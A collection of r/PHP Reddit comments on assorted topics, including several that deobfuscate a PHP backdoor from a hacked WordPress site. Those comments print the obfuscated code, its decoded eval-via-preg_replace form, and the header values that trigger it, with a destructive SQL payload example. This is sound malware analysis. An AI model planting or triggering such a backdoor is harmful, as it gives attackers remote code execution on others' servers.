Since we're sharing php bots, I did [botzilla](http://github.com/bibby/botzilla) some years ago with a similar [plugin](http://github.com/bibby/botzilla_plugins) system. Worth a look to see how reminders, alarms, and history work.
Google: agile development process and check out jira for project management
1. I think that in 99% of cases, it won't really matter. Composer's autoloader means that the only real cost of unused classes is the hard drive space on your server, which is trivially small. 2. Yes, because presumably your primary codebase needs to know the interface regardless of where the drivers that implement it live. Also, see #3. 3. Something I've seen with the upcoming version of Laravel is the [Illuminate/Contracts](https://github.com/illuminate/contracts) repository, which *only* contains the interfaces implemented by Laravel. I believe the idea is that you can use the interfaces for Laravel integration and testing without having to include the actual framework as a dependency. Your codebase probably isn't large enough to justify that, however. So I'd include the `CacheInterface` as part of your primary repository, and then have that as a dependency for your cache drivers.
http://teamtreehouse.com/tracks/php-development http://teamtreehouse.com/library/standards-and-best-practices
what does that mean? 
Looks good gajus. Keep up the good work. You have the right ideas on templating. 
The outer while loop is a "reconnection" loop, which only comes to an end when a connection is interrupted. And even then it waits 30 seconds before reconnecting.
To expand on this, SCRUM is so very helpful, and I feel, underutilized.
I never heard of this... 2tb was also unheard of in anything short of a 4U server back in 01... unless it was distributed storage using glftpd kind of thing. The fastest/largest xdcc botnets were run off of RIT's and EV1s network out of #software and #gotwarez? in 2001. The largest channels back then were no more than 1000 users... I wish I could say I saw this in action... back then it was all tcl. 
I'm just happy I can use @foo like a Ruby symbol...
I often have a bit of doubts about paid material related to PHP resources, but with a quick skim this could be use for someone. Looks a nice set of material. But one thing I must preach (related to the Composer chapters) is the state of Composer security: https://github.com/composer/composer/issues/1074 It's been too long practically everyone ignores it and nobody even talks about it. This is something everyone using Composer must acknowledge and be aware of (and act accordingly). 
I agree with the assessment that Agile development methodologies would benefit you. I've used it for small teams, big teams, and remote teams. Any dev team would be immediately well served by having the following in place: 1) code repositories with version control 2) wiki for documentation 3) issue/bug/change request reporting &amp; resolution tracking. Atlassian provides a good suite for those that integrates Agile methodologies (Jira was mentioned before: see also Confluence, Crucible, SourceTree). I also found TRAC to be a great solution, for Subversion anyway. I use RallyDev.com as well. All good.
Thank you :)
Hi pitiless. You aren't the only one who has been put-off by the tone of the intro. My intention is not to compare two different methodologies. If anything, "If you are using one, you must have a good reason (such as cross-platform template processing)." was meant to emphasise that Brick is not the right tool for everyone. Though, I understand how that has come-across. I would appreciate your suggestions for the documentation (what type of examples would you like to see). Regarding sparsity of the tests. If you look at Brick v1, I have intentionally removed a lot of the test cases. Mostly, to keep the code base light. Even as it is, test cases cover all of the use cases. In case a bug is reported, I will add new test cases that cover practical situations.
I also think it's worth mentioning Phabricator, which is an open source alternative to Altassian suite, and is all written in PHP. Our team happily use it.
yup. that's what I remember too. Also php was at 4 and postgresql only advantage back then was transactional not performance. We've come a long way since.. But I call bullshit on this dude. he's too full of himself but then again i'm at /r/PHP
Slight pet peeve... but Scrum is not an acronym, and all caps leads people to think it is. Scrum is in reference to the rugby scrum, and was coined in this context by Takeuchi and Nonaka in their paper "The New New Product Development Game". Ken Schwaber and Jeff Sutherland used the term to name their approach to development. I don't know whether it's right to say it's under-utilised. Most organisations which claim to use an agile approach also claim to use Scrum or some form of Scrum hybrid... so much so that "Agile" has almost become synonymous with "Scrum". It's difficult to suggest Scrum as the right approach to OPs projects. If he's a team of one or two people then it probably isn't going to work. Kanban, might be a better fit.. or take your pick from countless other approaches... 
Phabricator is very, very awesome. We use it on our team (~ 11 members), and it has replaced JIRA and Bitbucket for us. At __no__ cost. Also, the humorous texts throughout Phabricator brighten my day :). 
Yeah, you confirm that the main issue with that approach is that it's not worth the time on a "little" codebase, I'll stick to the current organization! Thanks.
I mostly disagree with Symfony's recommendations concerning this. They are OK for small apps where your domain is simple IMHO. Here is one good explanation why #2 is better option: https://www.youtube.com/watch?v=Nltqi7ODZTM I'm strongly in favor of decoupling your domain/business logic (basically all app specific stuff) from framework.
right on man, congrats!
One of the most important things to do with tight deadlines is expectation management. Be honest. if a deadline is tight, start telling the customer from the start: it's tight, and if we have 1 small hickup, we'll need to adjust. from the moment you know you won't make it, tell the customer, find a solution. Adjustments and solutions are often one of 2 things: extend the deadline or drop functionality. Projects are an interaction between 3 things: manpower, time and (estimated) requirements. if any of these 3 change, on or both of the other need to change.
He's saying it was an index database pointing to a lot of mp3s, the combined filesizes of which collectively totalled over 2 TB. 
Looks like my most recent project resembles example 2. It's about 5 or 6 modules, the directory looks like this: /app /public /vendor /my-project /config_module /config /src /entity_module /config /src /view_module /config /src /views 
1. Yes 2. Yes 3. Add the main repository as a dependency
Oh, I see. You have multiple loops. Never mind then.
Loving the vatsim plugin ;) I guess your a fellow flight simmer?
To be honest that will probably be the only WTF moment in a properly structured code
Sorta, haven't done much in a year or two. This bot is on a channel where most people are simmers, programmers and Linux users. At the same time.
When you say concurrent connections, I assume you mean there are multiple instances of PHP connecting at the same time, rather than the same script opening multiple connections. In that case, could you use the process ID as the connection ID? http://php.net/getmypid
Holy shit that is all awesome. You can be proud of that, dude. You can do so much cool stuff with irc. What an awesome achievement back then! What do you do now?
Thanks! Looking forward to watch them!
Yea the concurrent connections depends on how many users are accessing the feature at a given time. The Client IDs are provided to us, so we will have a predefined set of IDs, eg 100. So unfortunately we can't use an arbitrary ID such as the process id.
I'm also interested in what you created from 2000 to 2001. If you're going to call bullshit, I hope you don't mind getting in the mud yourself a little by showing us something you made that technically stretched PHP beyond what it could do at the time. I truly do not wish to come across as "full of myself", but I see how being proud of one's works can be seen as that. In fact, I'm quite mortified by how the code was, but I have to cut me some slack cuz I started it in 2000 in PHP 3 and the language was quite limited back then. I still remember porting it to PHP 4 in 2001 once people started upgrading from 3.
In that case you'll need to store them in a them in a data store like the ones you mentioned. For your app to be bullet proof you'll need to store which PHP process ID is using each connection ID. That way if a PHP script has aborted without releasing the lock you can look up which ones don't have a process with that PID. To eliminate race conditions you'll need to do an update query to set the process ID, then select it afterwards. For example: UPDATE pool SET process_id = :my_process_id WHERE process_id IS NULL LIMIT 1; SELECT connection_id FROM pool WHERE process_id = :my_process_id;
So what you're saying is that you did it better.. THIRTEEN years ago. Btw - I think I actually used this at one point. Good ol'eggdrop bots.
Is a bot writing these articles in 1998 and posting them to the future?
We have Trustwave come in every year for a two day class on securing web applications. They also perform regular security scans on our websites. Is it valuable? Absolutely. I work for a major US retailer and you haven't seen us in the news for any credit card hacks or web site compromises. (knock on wood)
we use asana.com to plan everything, its a very simple &amp; lean appraoch that fits perfectly into agile methods like scrum. for mocking up stuff i use balsamiq both are very affordable, jira is usually much more expensive.
True dat on the humor! 
Any particular reason you didn't go with ReactPHP as a base for this? Would be a case for IRC. [b]Edit:[/b] [It's been done](https://github.com/phergie/phergie-irc-client-react).
Phergie is nice, but sometimes you just need a simple socket and listener. Phergie really fits into: http://www.quickmeme.com/img/57/578226e4cdb681e648db8cdc0bfe3a53d6b93232ded2d9f9eb375d2927c28cd6.jpg
Running it on HHVM would be pointless, tbh. It's an irc bot, not a massively trafficked website. 
Upvote for asana.
Honestly' im more curious as to why that was base64_encoded in the first place?
&gt; Base64 encodes based on the binary value of the characters, therefore they have no semantic reason to be escaped. And when base64_decode returns the string, it's no longer in binary. I'm wondering how base64_decodes returns the string so that the PHP interpreter knows not to process special characters.
~~The special characters are only processed when the string is written to output via `echo` or `file_get_contents`, etc. in the interpolative context ( echo "$value_containing_escaped_characters"; ) Merely passing a string around as a value does not cause the interpreter to process the string.~~ This is incorrect, see jamend's explanation: http://www.reddit.com/r/PHP/comments/2nhq8i/how_does_base64_decode_return_a_string_without/cmdro4g
&gt; The special characters are only processed when the string is written to output via `echo` or `file_get_contents`, etc. Merely passing a string around as a value does not cause the interpreter to process the string. Ah fantastic. That's the answer I was looking for.
I'm sorry, this is wrong. The proper anatomy of a hash is the following: $2a$ = type 11$ = cost zKTTgVR.DRjGv1QkilT5l = salt .AkXjjrkxpX5CR/lrTRc1tk.el9Mqvd2 = the hashed text **edit**: some example code: $options = [ 'cost' =&gt; 11, 'salt' =&gt; join("", range('A', 'Z')), ]; echo password_hash("rasmuslerdorf", PASSWORD_BCRYPT, $options)."\n"; The first 21 (or whatever your CRYPT_SALT_LENGTH is set to) letters following the type and cost segments will read as the first 21 letters of the alphabet (ABCDEFGHIJKLMNOPQRSTU). 
TIL. Thanks for the information.
That's not correct. PHP does not use the escaped string literal in memory. Escape sequences are only processed when interpreting string literals in source code, putting the real string value in memory. They are not processed at output time, and they are not added when getting a string from some input (file etc.).
That was a total blunder on my part, I fixed it. Thanks! The provided salt is actually 22 characters for bcrypt (and I love that `bcryptuses22characters` is exactly 22 characters :P) However, it uses 21.25 characters (which is why the `s` on the end comes through as an `e` in the resulting hash for that salt) as detailed here: http://stackoverflow.com/questions/16280194/crypt-for-password-hashing-blowfish-produces-weird-output/16280909#16280909
He's asking for the situation where a string from an outside source (in this case, a base64 encoded version of the string with escaped characters) is decoded with escaped characters attached. Those escaped characters are not resolved and are part of the value in memory.
That's true, but you said "The special characters are only processed when the string is written to output", which is not.
Yes, I've clarified that. In my experience the situations in which my code did resolve to escaping when put to output was because of other factors (like being interpolated into a template) when I went back and tested it.
Another vote for Phabricator, it ties into GitHub and Jenkins pretty well and it's deployment tools are awesome. Code reviews have been great!
You're echoing from $result. Try $row instead. That's my first observation
That should be $row indeed ! although this doesn't fix my error. Still a blank page after editing that error. 
What's there more to do? Calls and outsourcing company in India, sends them your code and errors to fix and then integrates the fixes seamlessly back at the server =)
try enabling display_errors in your php.ini or by ini_set("display_errors", true); this will probably provide you with more information.
Mind.... blown. I've not seen AND used this way in PHP but coming from other languages this would be an easy mistake.
Still just a blank page without any errors. I've put display_errors = off to on and display_startup_errors = off to on too
Have you restarted the web server (apache?). After any change to php.ini you will need to restart the server software. 
Very useful advise ! I didn't ! Fatal error: Cannot use object of type mysqli_result as array in /Applications/MAMP/htdocs/modules/php/php.module(80) : eval()'d code on line 21 This is the error that i got. 
If you aren't following ken_tankerous advice, then that's the error you would receive. 
Nevermind ! this was the problem. When i "fixed" it the first time i was trying to do it too fast, and only changed one $result instead of all three.
And it did fix it ! great ! Thank you very much.
&gt; What's there more to do? Nothing, hence my follow-up, if it does the same thing as everything out there then, why?
Do I get a discount if I'm already subscribed?
Beats me. I'm here just to crack jokes =)
Tomorrow I plan to evaluate [arvenil/ninja-mutex](https://github.com/arvenil/ninja-mutex), it doesn't quite completly cover my use case, because I need to be able to access from a pool, but it could provide the foundation of the solution.
You're welcome.
Yea you do. Use the coupon "HOLIDAYSECRET2014" When you update your subscription. Source: I just did it.
I doubt that's the entire code - there'll be a part (likely involving gz / base64 functions) that is used to decode that block to something more familiar. There's sites that can decode this stuff for you. Most likely tho, it's some sort of entry point, likely involving 'eval' somewhere, possibly along with some file download functions, designed to allow the attacker to put pretty much whatever code they want on your server and then execute it. Wipe and reinstall from known good backups is pretty much the only way to be sure to get rid of this kind of stuff.
Right, I saw three more other files with the same content. Although the hacker managed to put these files in different directory (wp-content, wp-includes, etc.) so I had no idea which script is making the call. I also think fresh installation is the way to go. Thanks!
Interesting. May I know how you managed to decode it? Normally base_64 can be decoded using online tool like [PHPdecoder](http://ddecode.com/phpdecoder/) but does not work for this particular script.
That's going to be awesome! Maybe you can write it as a blog post and so I can visit the post from there.
I can see the logic of it's checking for a value. How did you decode the functions though? It looks like it was ciphered some how. What piece did you gather the function md5(getenv. . .)?
It looks like valid PHP to me. Simple executor.
This isn't base64, it's simply obfuscated PHP code. See that `$WtK4W2PK7_H=` at the beginning? That's one of many variables. Then there are a few comments hidden in there via /* */ and # (comment until end of line). After you remove those dead pieces of code you can start linebreaking by around any ;$, and then merging the concatenated strings. You end up with something like $WtK4W2PK7_H = 'Yt'.iqg6egvK; $v9 = '~z3?{?&amp;[_r~' &amp; '#^7?K&gt;-{W[='; $VZYb37HIEf = 'N?o^?M}?z{~' &amp; "o?EZ%_L/3?S"; $HkkLIyM = ':vl[-:_{w,'.RfkE.'}?_7+d' &amp; f7UY5z.'[ZW-[C_H?'.v_wo7; $yUwk5Pd = oWm5zo9.'?%s77-+rW-gj]' &amp; 'Qw8=~Ol?u{&lt;77gc_/M__'; $sIf9 = '/p}{v!' &amp; 'o=9;wi'; $cRI = AHaWpdjwK48E.'&lt;'.vRsYR.'~V?: m5@'.ff6HZG ^ '~-]4'.G_YJ.'%QJ~MC/'.FblF.'!HYA^C1Q[H%i:'; $YsYPg = 'I&amp;' | 'T&lt;'; $Yj9o9J3 = L ^ q; $n2VUca3zPPs = '`B%C^b%PlA#' | 'ppA%'.IPap.'`aB'; $GEM3 = e &amp; u; $iQAL71okcH = C ^ '*'; $_rFdYtNgZw = "d6=u&lt;c}-eam\$" ^ ',bi%c;"'.i749p; $TBsd_QmqVR = '_CM}'.u_W_k &amp; '_g~KGn|_I'; $rit = j ^ ':'; $wF76k = '%yW&amp;1M/' ^ '@:f'.'RS~@'; $rXnlFR7Orr = $v9 ^ $VZYb37HIEf; $NHn1sOPbk = (',[j' | '.[B') ^ ('0my' ^ 'sR&amp;'); $pR85Rg6waj = (ootw.'~w' &amp; ouwg.'~w') &amp; ('wo}un~' &amp; 'wo}un~'); $O5r = $HkkLIyM ^ $yUwk5Pd; $lLSNEr0I = $sIf9 ^ ('w|o{kj' &amp; gemk.')`'); $QOKdE0agy6 = $cRI &amp; ('}'.''.wscs.'?'.s4gv.'{{:6;}=t~?mo}{n=}x5~~7' &amp; 'yg}s{={&lt;nt3}25=}y{twm~e?{&lt;}tww~w'); if(!$rXnlFR7Orr($NHn1sOPbk($pR85Rg6waj($lLSNEr0I)), $QOKdE0agy6)) { $O5r($n2VUca3zPPs.$GEM3, array(('&gt;{'.zU6go &amp; '='._Nyt_o).$YsYPg.$GEM3.$iQAL71okcH, $pR85Rg6waj($_rFdYtNgZw.$TBsd_QmqVR.$rit), $wF76k.$Yj9o9J3)); } You can see here that a great deal of the code is just building up variables, mainly through some binary tricks (^, |, &amp;), for example `j ^ ':'` is a single uppercase P. Many of the variables also take advantage of PHPs "Use of undefined constant abc - assumed 'abc'" to further through a reader off. Anyway, if you just go through all of that you end up with if(!levenshtein(md5(getenv('HTTP_A')), '9e0c3934fd2904959007eba3b0504d25')) { call_user_func_array('preg_replace', array('&lt;[JQ4Go]&gt;ei', getenv('HTTP_X_DRUTT_CLIENT_IP'), 'eC1tb3o=')); } The Levenshtein function calculates string differences, and in this case since we check for false, it passes for equality (string difference = 0). MD5 is a hashing function, which needs some (secret) input to return `9e0c3934fd2904959007eba3b0504d25` - this could be anything, it's probably so nobody but the author can access this piece of malware. call_user_func_array is a function which executes a function defined by a string (in this case `preg_replace`) and passes the array as single parameters, so effectively it means `preg_replace('&lt;[JQ4Go]&gt;ei', getenv('HTTP_X_DRUTT_CLIENT_IP'), 'eC1tb3o=');` What happens now is something you just need to have seen before to understand - regular expressions in PHP support a so-called [execute-modifer](http://php.net/manual/en/reference.pcre.pattern.modifiers.php), that small e near the end of `&lt;[JQ4Go]&gt;ei` (most of these modifiers are actually quite useful: the i-modifier is used to not differentiate between uppercase/lowercase). Normally we would use preg_replace to replace certain parts of a string, but in this case, the author doesn't care: what matters, is that the second argument of preg_replace is executed whenever the first argument (the regular expression) matches the third argument (`eC1tb3o=`), and that happens exactly once - the lowercase o matches [JQ4Go]. So, effectively, the code becomes: if(md5(getenv('HTTP_A')) === '9e0c3934fd2904959007eba3b0504d25') { eval(getenv('HTTP_X_DRUTT_CLIENT_IP')); }
What he's saying that if you're parsing straight up XML you have to implement all the various feed flavours yourself, i.e. you should abstract away the type of feed you're dealing with. I.e. what you're suggesting it not transparent since it only knows about XML, not about feeds in particular. 
Ok I'll give it a try: Formatting (more or less paste in NetBeans and autoformat): &lt;?php $WtK4W2PK7_H = 'Yt' . iqg6egvK; $v9 = '~z3?{?&amp;[_r~' &amp; '#^7?K&gt;-{W[='; $VZYb37HIEf = 'N?o^?M}?z{~' &amp; /* tfmL'. 'Ix7E+ */"o?EZ%_L/3?S"; $HkkLIyM = ':vl[-:_{w,' . RfkE . '}?_7+d' &amp; f7UY5z . #vOJsjJURPpaT'. '[ZW-[C_H?' . v_wo7; $yUwk5Pd = oWm5zo9 . '?%s77-+rW-gj]' &amp; 'Qw8=~Ol?u{&lt;77gc_/M__'; 'H6r' . 'j~X'; $sIf9 = '/p}{v!' &amp; 'o=9;wi'; $cRI = AHaWpdjwK48E . '&lt;' . vRsYR . '~V?: m5@' . ff6HZG ^ #Z'. '~-]4' . G_YJ . '%QJ~MC/' . FblF . '!HYA^C1Q[H%i:'; $YsYPg = 'I&amp;' | 'T&lt;'; $Yj9o9J3 = L ^ q; 'WNlU' . 'GQm0yt&lt;'; $n2VUca3zPPs = '`B%C^b%PlA#' | 'ppA%' . IPap . '`aB'; $GEM3 = e &amp; u; 'DY0prT13h6iE' . '5mX;GW'; $iQAL71okcH = C ^ '*'; $_rFdYtNgZw = "d6=u&lt;c}-eam\$" ^ ',bi%c;"' . i749p; 'u45RLq' . ']YS~-T'; $TBsd_QmqVR = '_CM}' . u_W_k &amp; '_g~KGn|_I'; $rit = j ^ ':'; $wF76k = '%yW&amp;1M/' ^ '@:f' . 'RS~@'; $rXnlFR7Orr = $v9 ^ $VZYb37HIEf; $NHn1sOPbk = (',[j' | '.[B') ^ ('0my' ^ 'sR&amp;'); 'ZWh' . 'N'; $pR85Rg6waj = (ootw . '~w' &amp; ouwg . '~w') &amp; ('wo}un~' &amp; 'wo}un~'); $O5r = $HkkLIyM ^ /* BKg4'. '_KI,}JLzH */$yUwk5Pd; $lLSNEr0I = $sIf9 ^ ('w|o{kj' &amp; gemk . ')`'); $QOKdE0agy6 = $cRI &amp; ('}' . '' . wscs . '?' . s4gv . '{{:6;}=t~?mo}{n=}x5~~7' &amp; #mD_rmC43Dl8dscfc8F4FHgROf8EOntQAx1O'. 'yg}s{={&lt;nt3}25=}y{twm~e?{&lt;}tww~w'); if ( !$rXnlFR7Orr($NHn1sOPbk($pR85Rg6waj(/* F'. ',_ */$lLSNEr0I)), $QOKdE0agy6) ) $O5r( $n2VUca3zPPs . $GEM3, array( ('&gt;{' . zU6go &amp; '=' . /* '. 'gL]J1=X9#9 */_Nyt_o) . $YsYPg . $GEM3 . $iQAL71okcH, $pR85Rg6waj($_rFdYtNgZw . /* y30uNS'. 'qVdMeB^8{g */$TBsd_QmqVR . $rit), $wF76k . $Yj9o9J3 ) ); #zN-&gt;4Imh3r2G^]Zfa*!9NWS#U7_'. 'S%2inJ5oi]gi=%MmH_$:;_Q*tx*+*][B9Ix960Dt).H0? .s*p.'; Removing all comments and bogus parts first: &lt;?php $WtK4W2PK7_H = 'Yt' . iqg6egvK; $v9 = '~z3?{?&amp;[_r~' &amp; '#^7?K&gt;-{W[='; $VZYb37HIEf = 'N?o^?M}?z{~' &amp; "o?EZ%_L/3?S"; $HkkLIyM = ':vl[-:_{w,' . RfkE . '}?_7+d' &amp; f7UY5z . '[ZW-[C_H?' . v_wo7; $yUwk5Pd = oWm5zo9 . '?%s77-+rW-gj]' &amp; 'Qw8=~Ol?u{&lt;77gc_/M__'; $sIf9 = '/p}{v!' &amp; 'o=9;wi'; $cRI = AHaWpdjwK48E . '&lt;' . vRsYR . '~V?: m5@' . ff6HZG ^ '~-]4' . G_YJ . '%QJ~MC/' . FblF . '!HYA^C1Q[H%i:'; $YsYPg = 'I&amp;' | 'T&lt;'; $Yj9o9J3 = L ^ q; $n2VUca3zPPs = '`B%C^b%PlA#' | 'ppA%' . IPap . '`aB'; $GEM3 = e &amp; u; $iQAL71okcH = C ^ '*'; $_rFdYtNgZw = "d6=u&lt;c}-eam\$" ^ ',bi%c;"' . i749p; $TBsd_QmqVR = '_CM}' . u_W_k &amp; '_g~KGn|_I'; $rit = j ^ ':'; $wF76k = '%yW&amp;1M/' ^ '@:f' . 'RS~@'; $rXnlFR7Orr = $v9 ^ $VZYb37HIEf; $NHn1sOPbk = (',[j' | '.[B') ^ ('0my' ^ 'sR&amp;'); $pR85Rg6waj = (ootw . '~w' &amp; ouwg . '~w') &amp; ('wo}un~' &amp; 'wo}un~'); $O5r = $HkkLIyM ^ $yUwk5Pd; $lLSNEr0I = $sIf9 ^ ('w|o{kj' &amp; gemk . ')`'); $QOKdE0agy6 = $cRI &amp; ('}' . '' . wscs . '?' . s4gv . '{{:6;}=t~?mo}{n=}x5~~7' &amp; 'yg}s{={&lt;nt3}25=}y{twm~e?{&lt;}tww~w'); if ( !$rXnlFR7Orr($NHn1sOPbk($pR85Rg6waj($lLSNEr0I)), $QOKdE0agy6) ) $O5r( $n2VUca3zPPs . $GEM3, array( ('&gt;{' . zU6go &amp; '=' . _Nyt_o) . $YsYPg . $GEM3 . $iQAL71okcH, $pR85Rg6waj($_rFdYtNgZw . $TBsd_QmqVR . $rit), $wF76k . $Yj9o9J3 ) ); Note on the removed comments and "bogus" parts: if the file would parse itself on specific positions, you could not alter the file in any way. If we get to something like that, we can still replace the part with the original bits. Now we see, there is actually some `if(whatever) call(some, args, ...);` going on! A lot of bitwise XOR and AND, so lets start at the function call: `$rXnlFR7Orr` is defined as `$rXnlFR7Orr = $v9 ^ $VZYb37HIEf;` which when we replace the other two variables and just `var_dump` the variable results in the function name [levenshtein](http://php.net/levenshtein) (distance between two strings). So lets rinse and repeat... `$NHn1sOPbk` is [md5](http://php.net/md5)... `$pR85Rg6waj` is [getenv](http://php.net/getenv)... (Note here, that undefined constants like the `ootw` here will be transformed to a string `"ootw"` and raising a notice - which we don't care here. Also, this variable / function name is used further down in the code and we replace it too). `$lLSNEr0I` is the string `HTTP_A`. `$QOKdE0agy6` is the string `9e0c3934fd2904959007eba3b0504d25` which a quick md5 crack results in nothing else than the md5 value of the string `test` (`md5("test")`) --- So, we've got our first part. Seems like if we have an environment variable called `HTTP_A` with the content of `test`, our levenshtein distance will be 0 which then enter our if statement - yay. This is how the attack may trigger the attack: just send a HTTP header named `HTTP_A` with the value `test` and the script will run. --- I won't do the same for the rest of the script, so here is just the final result: if (!levenshtein(md5(getenv("HTTP_A")), md5("test"))) call_user_func_array("preg_replace", array("&lt;[JQ4Go]&gt;ei", getenv("HTTP_X_DRUTT_CLIENT_IP"), "eC1tb3o=")); which is again a little cryptic (so anti-hacking tools won't detect it that easy), we write it down a little nicer: &lt;?php $triggerHeader = \getenv("HTTP_A"); $payload = \getenv("HTTP_X_DRUTT_CLIENT_IP"); if ($triggerHeader == "test") { \preg_replace("&lt;[JQ4Go]&gt;ei", $payload, "eC1tb3o="); } Note tha the `$payload` can be any arbitrary php code as string due to the e-modifier (`PREG_REPLACE_EVAL`) in [preg_replace()](http://php.net/preg_replace) - which will be executed due to the replacement of the `o` character. So to "use" this exploit, call the script and send two headers, one with the content `HTTP_A: test` and one with `HTTP_X_DRUTT_CLIENT_IP: mysql_query('drop table users');` and there goes your users table... ;)
That would be nice, I just subbed today
Just imagining him going for a drink with Taylor and paying for the drink. Supporting Laravel's development!
Interesting analysis. In this case did this exploit simply happen due to incorrect permissions, or is there some other attack vector? http://codex.wordpress.org/Hardening_WordPress
Thanks for sharing! 
&gt; Currently, PHP developers' only resource is to create a final class with a private constructor, leading to untestable and error prone code. Why is this untestable and error-prone? It seems like `private function __construct() {}` would be pretty hard to screw up.
This is the wrong solution to PHP not being able to autoload functions.
I don't see why this is needed. It seems like a big anti-pattern to me. I mean, it's a violation of the Open-Closed Principle, the Liskov Substitution Principle *and* the Dependency Inversion Principle. Furthermore, it forces two mutually-exclusive concepts together. A `final` class can't be extended, while an `abstract` class is meant to be extended, making it quite a paradoxical concept.
This might not be the best practice pattern for people to use, but I see no reason for PHP not to allow people to make abstract final classes if they really wanted to.
I like the proposed behavior but hate the concept of having a class that is both **abstract** and **final**. Abstract strongly implies it's meant to be extended, final enforces that it cannot be extended. I don't think combining these two contradictory concepts to get the behavior we want is a good idea. Instead of this, why not add the ability to declare a static class? For example: static class ArrayUtil { public static function flatten(array $array, $keySeparator = '.') { /* snip */ } } The following in a static class's definition would result in a parse error: 1. Declaring a `__construct` method. 2. Declaring a non-static class variable 3. Declaring a non-static method 
You don't *always* need SOLID code. Take [`PHPUnit_Framework_Assert::assertEquals()`](https://github.com/sebastianbergmann/phpunit/blob/master/src/Framework/Assert.php), do we really need DI and LSP and all for that?
A better question is "Is there ever a need for something to be `abstract final`?"
You need to check your servers access logs. Usually you will see a file getting hit by the same IP over and over. Could be an executable hidden as an image. They will write to your files over and over. Use Sucuri or WordFence and it will help identify all the compromised files. You also need to figure out how they got in and fix that. Then change all passwords (account and db). I deal with hundreds of these a year. PM me if you need help.
A lot of themes and slider plugins use old versions of timthumb.php. I have seen. Few that the developer made their own version. 
Ah well nevermind. /u/boast03 and /u/B_E wrote good explanations.
They all do approximately the same thing. eval arbitrary code from an external source.
Yep indeed, Composer has such a role nowadays that this kind of issues must be fixed quickly (ironic, I know). Yesterday I was trying to provoke some discussion about if we could have company back up to fund fixing the issue. Or maybe some sort of crowd funding or something alike. I guess Composer has so many users that if even some folks donated $5 and companies, say, 10$, it would become a nice reward. As far as I'm aware, @padraicb has put quite a bit effort about the problem: https://github.com/composer/composer/pull/2745 Maybe some sort of funding could motivate finalizing it sooner (than later).
There was even an RFC for static classes some time back, I don't know what came of it, but it's clearly a far better proposal than the one linked here.
Interesting. Would love to see an "Open Source Edition" that you don't need to send e-mails to set up on your own hardware. I'm sure companies and corporations are happy to pay for hosted service, but being used to the OSS philosophy after years with Linux I was kinda disappointed to not find a "download" option on the page after reading "you can host on your own server"
The RFC answers that. But in any case I don't see a reason why not. It's not like adding a feature, it's removing an inconsistency.
This is very true and would probably cover the use case, I'd love to hear /u/guilhermeblanco's opinion on that.
Checkout http://flysystem.thephpleague.com, it has a Dropbox adapter.
Is it worth learning Laravel if you're already comfortable with another mature PHP Framework? Symfony developer here debating a subscription.
Most/many of these aren't actually about Laravel, they are about architecture and OOP principles i.e. SOLID, decorators etc. There's plenty of advanced stuff for PHP programmers who haven't had a formal OOP based education or experience in Java or another OOP language.
Sadly there is still no Paypal support.
Thanks! Shall do!
Sorry for the misunderstanding. Exceptiontrap Enterprise is the self-hosted version, but it's not open source. I should make that more clear.
What /u/meritt_zare means is that VCSs such as git already provide a mechanism that will allow you to do exactly what you want to do. Trying to replicate the same with Dropbox means a lot more work for you than implementing the same with git. Dropbox is not designed for this as it doesn't understand deltas, VCSs are built around deltas. EDIT: And if you're looking for a service for private git repos and deployment options try https://bitbucket.org/ . It's not as nice as github but it's a lot cheaper(free) for private repos.
Aww... I just purchased the lifetime subscription last week..
ill just wait for the followup
... my god, what did you do. now there are 666 template engines, the end is near.
Over time that's gonna be much cheaper!
I think PHP has enough cognitive dissonance going to to not also add things that are abstract ( designed to be extended ) and final ( non extendable ) to solve a single particular issue. A private constructor has always been an ok solution in all OOP languages. And actually making a class that is just a "namespace for static functions" is bad design practice anyway that leads to untestable code. Introducing asshackery to make other asshackery possible isn't a good idea. P.S. fried ice anyone ?
What about putting business logic in a service, and inject that service in your controller? Something like what's they're doing with the PageHandler here: http://welcometothebundle.com/symfony2-rest-api-the-best-2013-way/
GnuPGP will likely be faster as its binding to the gpgme C library, whereas the OpenPGP library you linked is a pure PHP implementation. The GnuPGP extension looks to be fairly stable, with the last two releases being compatibility updates.
Yeah. Jordi was hoping that Toran Proxy would be the solution, but I am not sure how well that is working out. Hopefully we can just fix it through open-source, like padraicb is doing. 
Aside from everything mentioned here check out CherryTree. http://www.giuspen.com/cherrytree/ Amazing note/code taking application, keyboard shortcuts for everything works cross platform, sync via a single file in your dropbox. I live my life in it. Quick demo I did for someone http://youtu.be/LLwuiy1MI4M a while back
How much was the lifetime?
&gt; I'd extract that out to a some sort of MailerNotifiy class which should give you some space. I'd do the same, probably as a static method mailEveryone($project). One other random comment for OP is that he's redirecting with an 'Update successful' message regardless of whether the mail is sent. This may be desired behavior, or you may want to present to the user with a message saying the project was saved but notifications weren't sent, or build a process to add the mail to a retry queue. 
Why would I spend my hard earned money to help you do that?
With autoload function you still not get "namespaced static variables"
The current implementation isn't an inconsistency. Like I said in my original post: &gt;it forces two mutually-exclusive concepts together. A final class can't be extended, while an abstract class is meant to be extended, making it quite a paradoxical concept. Neither C# nor Java has this feature either and for good reason. 
The 3nf database to implement what you're talking about has a separate table of "attributes", and an association table that ties a listing to an attribute, optionally with a value. So Real Estate listing ID 3 that has two bedrooms, and the attribute field "bedroom_no" which has an id of 5 might show up together in the Listing_Attribute table as: listing_id attribute_id value 3 5 2 Then you probably need a table of listing categories (Real Estate, Job, etc), and another table that associates which attributes are legal in which categories (because you won't have a Jobs listing with a bathroom_no, I wouldn't think). This may be overnormalized for a general purpose search engine to work with, but it's certainly the best design for arbitrary query purposes. You could maybe assemble views that lay all this out in a flatter structure, and expose that to your search engine.
Escapes are not stored in memory, they're only processed when loading a string. The point of escapes is to allow the use of character sequences that would otherwise be impossible to represent in a string literal. For example, the quote character: $foo = 'bar'baz'; // won't work, because the string literal terminates at the first quote, and the rest of the statement generates an error. So you have to escape it: $foo = 'bar\'baz'; The escape sequence \' denotes to *load* an actual quote character as part of the string instead of a quote token which would end it. Note that I said *load*, because as soon as the statement executes, the actual value in memory no longer has the escape. So why doesn't the same issue happen in memory? In memory, there's no character to denote the end of the string. Instead, there's a field that specifies the length of the string, which makes it completely unnecessary to have a string terminator.
&gt;"static" means that any call to something will always return same value. It keeps state. By declaring a class static, it is the same as creating a singleton class. Every new Class must return same instance. This is different from what I proposed on RFC. You're wrong. &gt;A static class is basically the same as a non-static class, but there is one difference: a static class cannot be instantiated. In other words, you cannot use the new keyword to create a variable of the class type. http://msdn.microsoft.com/en-us/library/79b3xss3.aspx 
